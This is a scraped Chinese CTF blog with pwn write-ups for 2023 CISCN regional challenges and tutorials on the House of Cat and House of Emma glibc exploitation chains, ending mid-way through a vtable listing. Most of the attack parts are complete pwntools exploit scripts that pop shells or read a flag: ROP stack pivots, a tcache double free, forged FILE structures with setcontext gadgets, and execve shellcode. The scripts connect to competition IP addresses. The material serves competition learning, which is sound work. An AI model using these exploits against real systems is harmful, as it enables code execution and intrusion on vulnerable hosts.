异或过后rax的值就被设置成了system函数地址 而rdi寄存器的参数取决于rbp寄存器 rbp寄存器的值取决于我们一开始任意写的地址 fs_base-88处存放的值 计算好偏移 我们可以得到下面的payload 其可以实现call system 并且rdi参数为binsh payload = p64(target+0x8)+p64(0)+p64(target+0x18)+b&#x27;/bin/sh\\x00&#x27;payload = payload.ljust(0x68,b&#x27;\\x00&#x27;)payload = payload.ljust(0x88,b&#x27;\\x00&#x27;)+p64(system_addr) 但是你会发现system函数会卡在这里 这是因为我们破坏了tls结构体 我们把断点打在pthread_setcancelstate 看看rdx寄存器是怎么样赋值的 于是fs_base+0x10处的值不能被破坏 我们通过观察原本的tls结构会发现 其和fs_base+0x8处 是构成一个链表 由偏移0x10处指向偏移0x8处 而偏移0x8处指向自身 但是经过我实际测试 我们只需要保证fs:0x10处的地址+0x971后 是一个可读的内存地址即可 也就是说libc_addr-0x972也可以通过 那么最后的payload即为: payload = p64(target+0x8)+p64(0)+p64(target+0x18)+b&#x27;/bin/sh\\x00&#x27;payload = payload.ljust(0x68,b&#x27;\\x00&#x27;)+p64(libc_addr-0x972)payload = payload.ljust(0x88,b&#x27;\\x00&#x27;)+p64(system_addr) 完整expfrom pwn import*from ctypes import *io = process([&quot;./pwn&quot;,&#x27;run&#x27;])#io = remote(&quot;175.20.26.10&quot;,9999)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)io.recvuntil(&quot;UserName: &quot;)io.sendline(b&#x27;LD_DEBUG=all&#x27;)io.recvuntil(&quot;LD_DEBUG=all@Note $ &quot;)# gdb.attach(io,&#x27;b *$rebase(0x150D)&#x27;)# pause(0)io.sendline(&quot;++--++--&quot;)# pause()io.recvuntil(&quot;Super note: &quot;)number = int(io.recv(5),10)success(hex(number))io.recvuntil(&quot;LD_DEBUG=all@Note $ &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1730)&#x27;)# pause(0)number += 0x1cpayload = cyclic(0x30)+p16(number)io.send(payload)# pause()io.recvuntil(&quot;LD_DEBUG=all@Note $ &quot;)io.sendline(b&#x27;Note_Add&#x27;)io.recvuntil(&quot;Size: &quot;)payload = cyclic(0x19)# gdb.attach(io,&#x27;b *$rebase(0x17ff)&#x27;)# pause(0)io.send(payload)# pause()io.recvuntil(&quot;base: &quot;)libc_addr = int(io.recv(18),16)success(&quot;libc_addr :&quot;+hex(libc_addr))io.recvuntil(&quot;[Addr] &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1BF1)&#x27;)# pause(0)envp_addr = libc_addr + libc.sym[&#x27;environ&#x27;]io.send(p64(libc_addr))# pause()target = libc_addr - 0x2898 - 0x28 - 0x58stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;[Addr] &quot;)success(&quot;target_addr :&quot;+hex(target))# gdb.attach(io,&#x27;b *$rebase(0x1C32)&#x27;)# pause(0)io.send(p64(target))# pause()system_addr = libc_addr + libc.sym[&#x27;system&#x27;]payload = p64(target+0x8)+p64(0)+p64(target+0x18)+b&#x27;/bin/sh\\x00&#x27;payload = payload.ljust(0x68,b&#x27;\\x00&#x27;)+p64(libc_addr-0x972)payload = payload.ljust(0x88,b&#x27;\\x00&#x27;)+p64(system_addr)io.recvuntil(&quot;[Write] &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1C6A)&#x27;)# pause(0)io.send(payload)# pause()io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"2023Ciscn华东南分区赛","slug":"2023Ciscn华东南分区赛","date":"2023-06-25T05:49:00.000Z","updated":"2023-09-14T17:17:38.000Z","comments":true,"path":"2023/06/25/2023Ciscn华东南分区赛/","link":"","permalink":"http://example.com/2023/06/25/2023Ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/","excerpt":"","text":"前言第一次打awdp赛制的比赛 对于fix和attack节奏的把控有了一些理解 还学到了一点fix的小技巧 当然attack的题目也学到了很多东西 来做一个总结 login __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char buf[240]; // [rsp+10h] [rbp-F0h] BYREF sub_4011FB(a1, a2, a3); sub_40127B(); puts(&quot;Welcome to CISCN 2023!&quot;); puts(&quot;Enter your password:&quot;); read(0, buf, 0x90uLL); puts(&quot;Login failed...&quot;); puts(&quot;Try again!&quot;); puts(&quot;Enter your password:&quot;); read(0, &amp;unk_404060, 0x90uLL); return 0LL;&#125; 可以溢出0x10字节 同时可以往bss段写入数据 说实话 这种考点是我玩剩下的 出过很多这种类型的题目 这题很快就拿下了 由于read函数的rsi是通过rbp寄存器来索引的 我们只需要覆盖rbp为bss段地址 随后控制retaddr为read函数的参数赋值起始地址 就可以达成任意写 随后就是往bss段上写rop链泄露libc地址 然后利用pop rbp继续控制rbp的地址 然后再次跳转实现任意写 最后构造system from pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;175.20.26.11&quot;,9999)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc.so.6&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Enter your password:&quot;)bss_addr = elf.bss(0x800)ptr_addr = 0x401316rdi_addr = 0x00000000004013d3leave_addr = 0x000000000040136eret_addr = 0x000000000040101arbp_addr = 0x00000000004011bdputs_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.sym[&#x27;puts&#x27;]payload = cyclic(0xf0)+p64(bss_addr+0xf0)+p64(ptr_addr)io.send(payload)io.recvuntil(&quot;Enter your password:&quot;)payload = b&#x27;aaaa&#x27;# gdb.attach(io,&#x27;b *0x40136F&#x27;)# pause(0)io.send(payload)# pause()payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(rbp_addr)+p64(elf.bss(0xbf8))+p64(ptr_addr)+p64(rbp_addr)payload = payload.ljust(0xf0,b&#x27;\\x00&#x27;)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)payload = b&#x27;aaaa&#x27;io.send(payload)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;puts&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))payload = p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)payload = payload.ljust(0xf0,b&#x27;\\x00&#x27;)+p64(elf.bss(0xb00))+p64(leave_addr)io.send(payload)payload = b&#x27;aaaa&#x27;# gdb.attach(io,&#x27;b *0x40136F&#x27;)# pause(0)io.send(payload)# pause()io.interactive() ​ wargame这题的代码量很大 需要慢慢审计 最后是在adjust weapon中 发现了一个函数可以往堆地址写入数据 并且是用for循环来的 将for循环的次数修改为0次后就通过了check char __fastcall sub_2E18(__int64 a1)&#123; char result; // al int i; // [rsp+1Ch] [rbp-4h] if ( dword_81E4 ) return puts(&quot;Error.&quot;); result = printf(&quot;Info: &quot;); for ( i = 0; i &lt;= 9; ++i ) &#123; result = sub_15FF(a1 + 16 + 32 * i + 16LL, 16LL) == 0; if ( result ) break; &#125; dword_81E4 = 1; return result;&#125; notepad2.35的一道堆 存在UAF漏洞 int sub_16B0()&#123; int result; // eax char *v1; // rbx __printf_chk(1LL, &quot;page: &quot;); result = choice(); if ( result &lt;= 0xE ) &#123; v1 = &amp;unk_4040 + 16 * result; if ( *v1 ) &#123; free(*v1); *(v1 + 2) = 0; result = puts(&quot;Success~&quot;); &#125; &#125; return result;&#125; 置零的是存放size的指针 将其修改为v1 置零堆块指针即可成功fix attack的话 这题除了UAF之外 edit函数中还存在一个漏洞 int sub_1790()&#123; unsigned int v0; // eax char *v1; // rbx __printf_chk(1LL, &quot;page: &quot;); v0 = choice(); if ( v0 &gt; 0xE ) return puts(&quot;The notepad don&#x27;t have this page!&quot;); v1 = &amp;unk_4040 + 16 * v0; if ( !*v1 ) return puts(&quot;The notepad don&#x27;t have this page!&quot;); **v1 = 0LL; if ( !*(v1 + 2) ) return puts(&quot;The notepad don&#x27;t have this page!&quot;); __printf_chk(1LL, &quot;date: &quot;); sub_13E0(*v1); __printf_chk(1LL, &quot;content: &quot;); return sub_13E0((*v1 + 16LL));&#125; 可以看到在检查size指针之前 就对chunk的前0x10字节清空了 这意味着我们可以在释放chunk到tcachebin后 借此来清空key域 以此来实现double free 随后就是2.35的io链利用 from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;175.20.26.10&quot;,9999)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc.so.6&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()def add(size,data,payload): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;date: &quot;) io.sendline(data) io.recvuntil(&quot;content: &quot;) io.sendline(payload)def show(index): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;page: &quot;) io.sendline(str(index))def delete(index): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;page: &quot;) io.sendline(str(index))def edit(index): io.recvuntil(&quot;&gt;&gt; &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;page: &quot;) io.sendline(str(index))for i in range(8): add(0x80,b&#x27;aaaa&#x27;,b&#x27;aaaa&#x27;)delete(1)show(1)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))&gt;&gt;8success(&quot;heap_addr :&quot;+hex(heap_addr))for i in range(6): delete(i+2)delete(0)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x219ce0success(&quot;libc_addr :&quot;+hex(libc_addr))add(0xf0,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;)add(0xf0,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;)delete(9)delete(8)edit(8)delete(8)stderr_addr = libc_addr + libc.sym[&#x27;stderr&#x27;]key = heap_addr success(&quot;key:&quot;+hex(key))# ptr_addr = libc_addr + 0x2282c0# success(hex(ptr_addr))# add(0xf0,p64(key^ptr_addr),&#x27;aaaa&#x27;)# add(0xf0,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;)# success(hex(ptr_addr))# fake_addr = (heap_addr*0x1000)# fake_addr += 0x9b0# dyn_addr = libc_addr + 0x218bc0# a_addr = libc_addr + 0x265890# b_addr = libc_addr + 0x2282b0# add(0xf0,p64(dyn_addr)+p64(fake_addr),p64(a_addr)+p64(b_addr))# onegadget_addr = libc_addr# payload = p64(0)*3 + p64(fake_addr)# payload = payload.ljust(0x38,b&#x27;\\x00&#x27;)+p64(fake_addr+0x58)+p64(8)+p64(onegadget_addr)# payload = payload.ljust(0x100,b&#x27;\\x00&#x27;)+p64(fake_addr+0x40)# payload = payload.ljust(0x110,b&#x27;\\x00&#x27;)+p64(fake_addr+0x48)# payload = payload.ljust(0x31c-0x10,b&#x27;\\x00&#x27;)+p64(0x1c)# add(0x100,payload,p64(0))# success(hex(fake_addr))# debug()# chunk_addr = (heap_addr*0x1000)+0x7a0gadget_addr = libc_addr + 0x00000000001675b0setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))rdx_r12_addr = libc_addr + 0x000000000011f497ret_addr = libc_addr + 0x0000000000029cd6binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]io_lock = libc_addr + 0x21ba60_IO_wfile_jumps = libc_addr + libc.sym[&#x27;_IO_wfile_jumps&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]heap_addr = heap_addr *0x1000fake_FILE_addr = heap_addr + 0x9d0wide = heap_addr + 0xaf0fake_FILE = b&#x27;/bin/sh\\x00&#x27;fake_FILE += p64(0)*13fake_FILE += p64(2) + p64(0xffffffffffffffff)fake_FILE += p64(00) + p64(io_lock)fake_FILE += p64(0xffffffffffffffff) + p64(0)fake_FILE += p64(wide) + p64(0)fake_FILE += p64(0)*2fake_FILE += p64(1)fake_FILE += p64(0)*2 + p64(_IO_wfile_jumps+0x30)add(0x100,&#x27;aaaa&#x27;, fake_FILE+b&#x27;\\n&#x27;) #10fake_FILE2 = p64(0)*2 + p64(1) + p64(2)+p64(3)fake_FILE2 += p64(0)*22 + p64(wide+0xe8-0x18)fake_FILE2 += p64(wide+0xe8-0x18)+p64(system_addr)add(0x100,&#x27;aaaa&#x27;, fake_FILE2+b&#x27;\\n&#x27;) #11IO_list_all = libc_addr + libc.sym[&#x27;_IO_list_all&#x27;]add(0xf0, p64(key^IO_list_all),&#x27;1&#x27;) #12add(0xf0,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;) #13add(0xf0, p64(fake_FILE_addr),&#x27;aaaa&#x27;) #14io.recvuntil(&quot;&gt;&gt; &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1212)&#x27;)# pause(0)io.sendline(b&#x27;5&#x27;)io.interactive() masknote__int64 vuln()&#123; __int64 result; // rax char s[128]; // [rsp+0h] [rbp-80h] BYREF memset(s, 0, sizeof(s)); printf(&quot;\\x1B[0;34mNice to meet you!\\n\\x1B[0m&quot;); printf(&quot;\\x1B[0;32myour name:\\x1B[0m&quot;); read(0, name, 0x80uLL); printf(&quot;\\x1B[0;32mMask:\\x1B[0m&quot;); read(0, Mask, 0x64uLL); check_Mask(Mask); sprintf(s, Mask, name); printf(&quot;\\x1B[0;32myour Masked name:\\x1B[0m&quot;); write(1, s, 0x80uLL); printf(&quot;\\x1B[1;33mWelcome!\\n\\x1B[0m&quot;); while ( 1 ) &#123; menu(); __isoc99_scanf(&quot;%d&quot;, &amp;choice); result = (unsigned int)choice; if ( choice == 5 ) break; switch ( choice ) &#123; case 1: add(); break; case 2: show(); break; case 3: edit(); break; case 4: delete(); break; &#125; &#125; return result;&#125; 看起来像一道堆题 但是实际是sprintf函数的利用 其如果使用%c可以打印空字符 就存在栈溢出 但是由于不能读入\\x00 所以只能覆盖retaddr 由于开局mmap了一个地址 权限是可写可读可执行 所以我们可以往其写入shellcode 随后利用栈溢出修改retaddr from pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;175.20.26.208&quot;,9999)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc.so.6&quot;)def debug(): gdb.attach(io) pause()def add(index,size): io.recvuntil(&quot;Your choice:&gt;&gt;&quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Idx:&quot;) io.sendline(str(index)) io.recvuntil(&quot;Size:&quot;) io.sendline(str(size))def show(index): io.recvuntil(&quot;Your choice:&gt;&gt;&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Idx:&quot;) io.sendline(str(index))def edit(index,payload): io.recvuntil(&quot;Your choice:&gt;&gt;&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Idx:&quot;) io.sendline(str(index)) io.recvuntil(&quot;context: &quot;) io.send(payload)def delete(index): io.recvuntil(&quot;Your choice:&gt;&gt;&quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Idx:&quot;) io.sendline(str(index))io.recvuntil(&quot;your name:&quot;)io.send(b&#x27;aaaaaaaa&#x27;+b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;)io.recvuntil(&quot;Mask:&quot;)# gdb.attach(io,&#x27;b *0x401813&#x27;)# pause(0)leave_ret = 0x0000000000401392#0x50a37#4017A1payload = b&#x27;aa%34$s%126caa&#x27;+b&#x27;\\x08\\x80\\x80\\x80&#x27;io.send(payload)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x2652e0success(&quot;libc_addr :&quot;+hex(libc_addr))# pause()io.recvuntil(&quot;Your choice:&gt;&gt;&quot;)# gdb.attach(io,&#x27;b *0x4018EE&#x27;)# pause(0)io.sendline(b&#x27;5&#x27;)# pause()io.interactive()# io.send(&#x27;aaa&#x27;)# io.recvuntil(&quot;Mask:&quot;)# onegadget_addr = libc_addr + 0xebd52# gets_addr = libc_addr + libc.sym[&#x27;gets&#x27;]# payload = b&#x27;%110caaaaaaaaaaaaaaaaaa&#x27;+cyclic(0x8)+p64(gets_addr)# # gdb.attach(io,&#x27;b *0x4017FD&#x27;)# # pause(0)# io.send(payload)# # pause()# gdb.attach(io,&#x27;b *0x4018EE&#x27;)# pause(0)# io.sendline(b&#x27;5&#x27;)# pause() dbgnote这题fix的关键是溢出 经过代码审计发现有两处地方分别存在2字节溢出和1字节溢出 位于username的读入和chunk size的读入 将其修改为无溢出即可通过check if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"House of Cat","slug":"House-of-Cat","date":"2023-06-07T06:08:44.000Z","updated":"2023-09-14T17:19:26.000Z","comments":true,"path":"2023/06/07/House-of-Cat/","link":"","permalink":"http://example.com/2023/06/07/House-of-Cat/","excerpt":"","text":"前言2.34以上的版本取消了hook的存在 导致我们getshell的操作只能通过其他办法了 于是house of的链学习就成为了必要 house of cat这条链 只需要一次largebinattack的机会 随后就是伪造io结构 就可以做到劫持程序执行流 诸如setcontext等的利用 链路分析触发io的方式和house of kiwi相似 都是通过assert输出报错 不过还是有所不同 接下来跟着我来分析一下 截止到__main_assert函数的时候 链路都和house of kiwi一致 这里就不复述了 不同的是 kiwi是利用fflush触发fake file 本次我们是通过fxprintf中的函数 来实现任意函数调用 原理是因为vtable虽然在2.24以后加入了检测 但是由于检测不严格 对于一些轻微的偏移可以被无视 所以我们可以修改vtable为其他的表并且加上偏移 就可以实现表内的函数任意调用 而在这些函数中 会存在一些以寄存器寻址的call指令 利用这一点我们就可以劫持程序执行流 本次利用的关键就是_IO_wfile_seekoff函数 其内部会调用IO_switch_to_wget_mode函数 该函数内部存在一个可以被我们控制的call指令 我们首先利用largebinattack将stderr的地址覆盖为堆地址 随后在堆中伪造结构体 将vtable结构体修改为_IO_wfile_jumps+0x10 这样就可以顺利调用到_IO_wfile_seekoff函数 接着回到gdb 我们跟进一下fxprintf函数 一起完整的过一遍链 我们还需要进行两次繁琐的函数跳转 随后才能到达利用的关键函数点 这里 就会进入被我们所伪造的vtable表固定的偏移中 在我们上面那样设置的情况下 最后是会调用到_IO_wfile_seekoff函数 我们跟进一下 可以看到 其内部存在IO_switch_to_wget_mode函数 我们跟进一下 这里存在一个可控的call指令 rax的值可以被我们所操控 是写入到stderr上的堆地址固定偏移的一块地址 如果我们在此处地方写入打setcontext用的万能gadget 再搭配上setcontext 就可以做到控制程序执行流 链路其实是比较清晰的 我们主要是来看一下如何伪造 很多网上的资料其实伪造部分都没有讲清楚 伪造分析 首先我们提供一个完整的fake file构成 我们根据上面所圈出来的框 依次来讲解为什么要如此设定 需要绕过哪些地方 因为授人以鱼不如授人以渔 教会如何利用好动调来伪造结构体才是最重要的 虽然这篇文章也不能让你马上掌握这个能力 首先是灰框部分 之所以要这样布局 我们先来看前面的这个libc地址 要明白其用意何在 我们首先要定义到需要这个参数的位置 我的办法是直接n 通常会直接卡在某个语句或者触发某个报错 通过这个办法来判断执行到了哪个汇编语句 可以看到 是触发了进程的终止 那么这个一般是由于vtable表的检测失败引起的 为了佐证我们的猜想 我们找到触发检测的函数 随后直接n 看能不能通过这个函数 结果发现不行 印证了猜想 那么我们要想绕过这一点 显然就是靠最近的一次判断 只要不跳转到执行vtable表检测的地方就行了 关键的两个寄存器 就是rcx和rax了 rcx最后一次的复制和rax有关系 而rax当时的值是一个相对固定的 rax最初的值是一个相对固定的 索引到的是一个libc地址 而执行到sub的时候 对应的参数是一个栈上的地址 显然sub后的rax值我们并没有办法改变 那么重点就是放在通过r12来影响rax的值 注意到最开始r12的赋值语句 和rbp有关系 而rbp的值正是我们的fake file的起始地址 而对应的偏移正是我们所说的灰色部分 但是由于赋值完以后还要减去rdi寄存器的值 所以最后赋值给rax的值最好比较大一点 接下来 我们根据程序执行流跟进到_IO_wfile_seekoff函数 可以看到要想成功执行到Io_switch_to_wget_mode函数 就需要我们通过上面的cmp判断 rcx和rdx这两个寄存器 分别溯源一下最后一次赋值 和rax有关 而rax为fake file的起始地址 对应的偏移处是我们最开始图片的红框 我们要使得二者的值不一样 才能进入_IO_wfile_seekoff函数 进入_IO_wfile_seekoff 可以看到此时我们就可以进行任意地址call了 对应的偏移是0xe0 对应着我们最开始图片的 黄框 并且另外一个参数还有作用 这个后面遇到了再讲 接着就是万能gadget的调用了 此时rdi的值就是fake file的起始地址 我们需要给其设定对应的值 以此来决定rdx的值 从而控制最后的call 对应着我们图片中的红框蓝框 我们将其布置好 使得接下来执行setcontext 然后后面的就是setcontext的利用问题了 这里就不讲了 没有提到的是紫色框中的参数 这一部分 我们直接将其赋为0 随后n看会卡在哪个地方 可以看到会卡在这里 这里是因为rdi+8处不是一个地址 但是这里的cmp又要调用对应地址的内容 所以就无法进行 我们溯源一下 看看rdi的值是怎么得到的 可以看到和rbx有关系 而动调发现rbx的值就是fake file的起始地址 所以在对应地址布置一下就好了 模板首先泄露libc地址和hepa地址 随后利用largebinattaack在stderr写入可控堆块地址用来充当fake file 随后布置好结构体 利用top chunk或者largebin chunk来触发io链 最后orw add(0x420)#0add(0x10)#1add(0x410)#2add(0x10)#3delete(0)add(0x500)#4delete(2)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x21a0b0success(&quot;libc_addr :&quot;+hex(libc_addr))delete(1)show(1)io.recv()heap_addr = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))&lt;&lt;12success(&quot;Heap_addr :&quot;+hex(heap_addr))stderr_addr = libc_addr + libc.sym[&#x27;stderr&#x27;]payload = p64(0)*3+p64(stderr_addr-0x20)edit(0,len(payload),payload)add(0x500)#5next_chain = 0gadget_addr = libc_addr + 0x0000000000165fa0setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))rdx_addr = libc_addr + 0x000000000005f65aret_addr = libc_addr + 0x0000000000028a87binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]gadget_addr = 0x0000000000165fa0+libc_addropen_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]ioaddr=heap_addr+0x6e0flag_addr = heap_addr+0x728next_chain = 0fake_IO_FILE = p64(0)+p64(0)+p64(0)+p64(heap_addr+0x730)+p64(0)*2+p64(1)+p64(0)*4+b&#x27;./flag\\x00\\x00&#x27;fake_IO_FILE +=p64(0)fake_IO_FILE +=p64(0)fake_IO_FILE +=p64(1)+p64(0)fake_IO_FILE +=p64(setcontext_addr)fake_IO_FILE +=p64(gadget_addr)#call addrfake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(0) # _chainfake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(heap_addr+0x200) # _lock = writable addressfake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#x27;\\x00&#x27;)fake_IO_FILE +=p64(0)+p64(0)+p64(ioaddr) #rax1fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(0) # _mode = 0fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(libc_addr+0x2160c0+0x10) # vtable=IO_wfile_jumps+0x10fake_IO_FILE +=p64(0)*3+p64(libc_addr+0x2160c0+0x10)+p64(heap_addr+0x740)+p64(0)fake_IO_FILE += p64(heap_addr+0x7e0)+p64(ret_addr) # rax2fake_IO_FILE += p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)fake_IO_FILE += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(heap_addr+0x1000)+p64(rdx_addr)+p64(0x100)+p64(read_addr)fake_IO_FILE += p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(heap_addr+0x1000)+p64(rdx_addr)+p64(0x100)+p64(write_addr)edit(1,len(fake_IO_FILE),fake_IO_FILE)payload = cyclic(0x508)+p64(0x300)edit(5,len(payload),payload)# gdb.attach(io,&#x27;b *$rebase(0x143A)&#x27;)# pause(0)add(0x1000)#6# pause()io.recv()io.recv() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"House of Emma","slug":"House-of-Emma","date":"2023-06-06T04:25:58.000Z","updated":"2023-09-14T17:19:34.000Z","comments":true,"path":"2023/06/06/House-of-Emma/","link":"","permalink":"http://example.com/2023/06/06/House-of-Emma/","excerpt":"","text":"前言一种利用难度低 但是效果很强大的house of链 只需要两次largebinattack就可以做到控制程序执行流 链路分析触发方式是基于house of kiwi 通过top chunk的size不足以供分配时 申请一个大size 而此时top chunk的size经过不正常覆盖 导致的检测失败 触发报错 引起的stderr结构体任意函数调用 断点打在所有的伪造已经结束后 我们触发报错 准备利用fake_file 跟进到malloc函数中的int_malloc 随后跟进到sysmalloc函数 触发malloc_assert函数 到这里和house of kiwi都还是利用的同一条链 接下来的会有所差别 house of kiwi考的是劫持IO_list_all来实现的fake_file 随后劫持vtable结构体 而此次链是利用stderr标准报错的输出来利用 我们首先需要跟进一下__fxprintf函数 从这两条汇编可以看出 确实是和stderr有关 这里其存储的值已经被我利用largebinattack修改为了堆地址 接下来 来看一下是如何一步步获取控制执行流的能力以及要绕过哪些判断 这里是第一个需要注意的点 此时rdi的值由rbx+0x88索引得到 而这个地址也是位于堆地址上的 这个值在随后的cmp指令中 嵌套了一个qword ptr 这意味着其值需为一个地址 才能继续执行下去 这里我选择的是堆基址 也就是rdi如图所示的值 随后跟进到locked_vfxprintf函数中继续利用 随后继续跟进函数 接着你会发现 在这个函数中 存在一个致命的任意函数调用 这张图中最重要的就是rax寄存器 这个值如何控制 可以看到call执行的地址和rax寄存器是相关的 控制了rax也就可以控制程序执行流 我们回溯一下汇编代码 定位到可供我们控制rax值的语句 我们定位了到了这一句 可以看出此时r12寄存器的值是我们覆盖stderr的堆地址 也就是说在对应0xd8偏移处 填入我们想要其call的目标 就可以劫持程序执行流 实际上也就是覆盖了vtable结构体 那么接下来的手法就是很普遍的2.29以后万能gadget+setcontext的办法来控制程序执行流 这里我懒得写orw了 只写了个system链 完整的伪造随后分析吧 接下来来看一下相关的注意事项 注意事项首先我们要明白本次利用是如何获取执行流控制的机会的 对于vtable的具体位置的检测是比较宽松的 也就是说我们可以轻微的更改原本的偏移 使得我们调用到原本vtable表中的任意函数 static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_default_xsgetn), JUMP_INIT(seekoff, _IO_cookie_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_file_setbuf), JUMP_INIT(sync, _IO_file_sync), JUMP_INIT(doallocate, _IO_file_doallocate), JUMP_INIT(read, _IO_cookie_read), JUMP_INIT(write, _IO_cookie_write), JUMP_INIT(seek, _IO_cookie_seek), JUMP_INIT(close, _IO_cookie_close), JUMP_INIT(stat, _IO_default_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, 